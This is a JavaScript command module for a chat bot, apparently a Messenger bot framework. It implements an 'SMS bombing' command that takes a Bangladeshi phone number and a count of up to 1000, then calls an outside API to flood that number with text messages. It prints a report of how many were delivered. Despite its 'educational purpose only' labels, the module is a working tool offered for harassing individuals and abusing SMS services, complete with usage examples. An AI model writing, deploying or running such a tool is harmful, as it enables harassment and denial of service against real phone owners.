const axios = require('axios');

module.exports = {
  config: {
    name: "smb",
    version: "2.0",
    author: "MR_FARHAN",
    countDown: 5,
    role: 0,
    shortDescription: "SMS bombing tool",
    longDescription: "Send multiple SMS to a target number (Educational purpose only)",
    category: "Tools",
    guide: {
      en: "{pn} <number> <count>\nExample: {pn} 01912345678 100"
    },
    aliases: ["smsbomb", "sbomb"]
  },

  onStart: async function({ api, event, args, message }) {
    try {
      // Check arguments
      if (args.length < 2) {
        return this.showHelp(message);
      }

      const number = args[0];
      const count = parseInt(args[1]);

      // Validate number
      if (!this.isValidBangladeshiNumber(number)) {
        return message.reply(
          "❌ Invalid Bangladesh number!\n" +
          "📱 Format: 01XXXXXXXXX\n" +
          "💡 Example: 01789138157"
        );
      }

      // Validate count - MAX 1000
      if (isNaN(count) || count < 1 || count > 1000) {
        return message.reply(
          "❌ Invalid count!\n" +
          "📊 Range: 1-1000\n" +
          "💡 Example: 100"
        );
      }

      // Send processing message
      const processingMsg = await message.reply(
        `📱 𝐒𝐌𝐒 𝐁𝐨𝐦𝐛𝐢𝐧𝐠 𝐒𝐭𝐚𝐫𝐭𝐞𝐝\n\n` +
        `📞 𝐓𝐚𝐫𝐠𝐞𝐭: ${number}\n` +
        `🎯 𝐂𝐨𝐮𝐧𝐭: ${count}\n` +
        `⚡ 𝐒𝐭𝐚𝐭𝐮𝐬: Initializing...\n` +
        `⏳ 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭...`
      );

      // Call SMS bombing API
      const result = await this.sendSMSBomb(number, count);
      
      if (!result.success) {
        await api.unsendMessage(processingMsg.messageID);
        return message.reply(`❌ Failed: ${result.error || "Unknown error"}`);
      }

      // Update message with results
      const summary = result.data.summary;
      
      await api.editMessage(
        this.formatResults(summary, result.data),
        processingMsg.messageID
      );

    } catch (error) {
      console.error("SMB error:", error);
      await message.reply("❌ An error occurred. Please try again.");
    }
  },

  // Send SMS bomb via API
  async sendSMSBomb(number, count) {
    try {
      const apiUrl = `https://shadowx-api.onrender.com/api/bm?num=${number}&count=${count}`;
      
      console.log(`📱 Calling SMB API: ${apiUrl}`);
      
      const response = await axios.get(apiUrl, { 
        timeout: 1200000, // 120 seconds timeout
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });
      
      const data = response.data;
      
      if (!data.success) {
        return {
          success: false,
          error: data.message || "API failed"
        };
      }
      
      return {
        success: true,
        data: data
      };
      
    } catch (error) {
      console.error("SMB API error:", error.message);
      return {
        success: false,
        error: error.message || "Network error"
      };
    }
  },

  // Format results beautifully
  formatResults(summary, fullData) {
    let text = `╭━━━━━━━━━━━━━━━━━━━━━╮\n`;
    text += `      📱 𝐒𝐌𝐒 𝐑𝐄𝐏𝐎𝐑𝐓 📱\n`;
    text += `╰━━━━━━━━━━━━━━━━━━━━━╯\n\n`;
    
    text += `📞 𝐓𝐚𝐫𝐠𝐞𝐭: ${summary.target}\n`;
    text += `🎯 𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐞𝐝: ${summary.requested}\n`;
    text += `✅ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥: ${summary.successful}\n`;
    text += `❌ 𝐅𝐚𝐢𝐥𝐞𝐝: ${summary.failed}\n`;
    text += `📊 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞: ${summary.success_rate_percent}\n\n`;
    
    text += `⏱️ 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: ${summary.duration_formatted}\n`;
    text += `🔄 𝐓𝐨𝐭𝐚𝐥 𝐀𝐭𝐭𝐞𝐦𝐩𝐭𝐬: ${summary.total_attempts}\n`;
    text += `⚡ 𝐀𝐏𝐈𝐬 𝐔𝐬𝐞𝐝: ${summary.apis_used}\n`;
    if (summary.average_time_per_message) {
      text += `⏰ 𝐀𝐯𝐞𝐫𝐚𝐠𝐞 𝐓𝐢𝐦𝐞: ${summary.average_time_per_message}ms\n\n`;
    } else {
      text += `\n`;
    }
    
    text += `📅 𝐒𝐭𝐚𝐫𝐭: ${new Date(summary.start_time).toLocaleTimeString()}\n`;
    text += `📅 𝐄𝐧𝐝: ${new Date(summary.end_time).toLocaleTimeString()}\n\n`;
    
    text += `⚠️ 𝐍𝐨𝐭𝐞: Educational purposes only\n`;
    text += `🤖 𝐀𝐏𝐈: ShadowX-API\n`;
    text += `👨‍💻 𝐃𝐞𝐯: Mueid Mursalin Rifat`;
    
    return text;
  },

  // Validate Bangladeshi mobile number
  isValidBangladeshiNumber(number) {
    // Check if it's a string
    if (typeof number !== 'string') return false;
    
    // Remove any spaces or special characters
    const cleanNumber = number.replace(/[^\d]/g, '');
    
    // Check length and starting digits
    if (cleanNumber.length !== 11) return false;
    
    // Check if starts with 01
    if (!cleanNumber.startsWith('01')) return false;
    
    // Check third digit (should be 3-9 for mobile operators)
    const thirdDigit = parseInt(cleanNumber[2]);
    if (thirdDigit < 3 || thirdDigit > 9) return false;
    
    return true;
  },

  // Show help
  showHelp(message) {
    const helpText = 
      `📱 𝐒𝐌𝐒 𝐁𝐨𝐦𝐛𝐢𝐧𝐠 𝐓𝐨𝐨𝐥\n\n` +
      `📝 𝐔𝐬𝐚𝐠𝐞:\n` +
      `• ${this.config.name} <number> <count>\n` +
      `• ${this.config.name} 01912345678 100\n\n` +
      `📋 𝐄𝐱𝐚𝐦𝐩𝐥𝐞𝐬:\n` +
      `• ${this.config.name} 01912345678 50\n` +
      `• ${this.config.name} 01712345678 200\n` +
      `• ${this.config.name} 01812345678 500\n\n` +
      `⚠️ 𝐋𝐢𝐦𝐢𝐭𝐬:\n` +
      `• Number must be Bangladeshi (01XXXXXXXXX)\n` +
      `• Count: 1-1000 (max)\n` +
      `• Educational purpose only\n\n` +
      `🤖 𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐛𝐲: ShadowX-API\n` +
      `👨‍💻 𝐃𝐞𝐯: Mueid Mursalin Rifat`;
    
    return message.reply(helpText);
  }
};
